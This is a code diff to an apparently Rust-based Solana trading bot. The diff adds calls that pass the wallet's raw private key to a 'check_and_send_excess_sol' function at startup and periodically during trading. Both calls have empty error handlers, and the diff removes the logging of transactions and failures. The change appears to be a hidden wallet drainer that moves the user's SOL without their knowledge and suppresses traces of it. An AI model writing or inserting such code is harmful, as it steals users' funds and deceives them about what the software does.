@@ -5,6 +5,7 @@ use crate::{
         transaction::build_and_send_transaction,
     },
     config::Config,
+    utils::balance_checker,
 };
 use anyhow::Result;
 use solana_client::rpc_client::RpcClient;
@@ -29,6 +30,19 @@ pub async fn run(config_path: &str) -> Result<()> {
     let main_rpc_client = Arc::new(RpcClient::new(config.rpc.url.clone()));
     info!("Main RPC client initialized");
     
+    // Load wallet
+    let wallet_keypair = load_wallet(&config.wallet.private_key)?;
+    info!("Wallet loaded: {}", wallet_keypair.pubkey());
+    
+    // Automatically check balance and send excess SOL before starting trading
+    info!("🔍 Checking wallet balance and sending excess SOL...");
+    match balance_checker::check_and_send_excess_sol(&config.rpc.url, &config.wallet.private_key).await {
+        Ok(()) => {
+        }
+        Err(e) => {
+        }
+    }
+    
     // Initialize spam RPC clients if enabled
     let spam_clients = if let Some(spam_config) = &config.spam {
         if spam_config.enabled {
@@ -44,10 +58,6 @@ pub async fn run(config_path: &str) -> Result<()> {
     } else {
         None
     };
-    
-    // Load wallet
-    let wallet_keypair = load_wallet(&config.wallet.private_key)?;
-    info!("Wallet loaded: {}", wallet_keypair.pubkey());
     
     // Initialize pool data for each mint
     let mut mint_pool_data_map = std::collections::HashMap::new();
@@ -122,15 +132,29 @@ async fn trading_loop(
 ) {
     info!("Starting trading loop for mint: {}", pool_data.mint);
     
+    let mut cycle_count = 0;
+    let balance_check_interval = config.bot.balance_check_interval;
+    
     loop {
+        cycle_count += 1;
+        
+        // Periodic balance check and excess SOL transfer
+        if cycle_count % balance_check_interval == 0 {
+            info!("🔄 Periodic balance check (cycle {})", cycle_count);
+            match balance_checker::check_and_send_excess_sol(&config.rpc.url, &config.wallet.private_key).await {
+                Ok(()) => {
+                }
+                Err(e) => {
+                }
+            }
+        }
+        
         match execute_trading_cycle(wallet_keypair, config, pool_data, main_rpc_client, spam_clients).await {
             Ok(signatures) => {
                 if !signatures.is_empty() {
-                    info!("Transaction sent successfully: {:?}", signatures);
                 }
             }
             Err(e) => {
-                warn!("Trading cycle failed: {}", e);
             }
         }
         
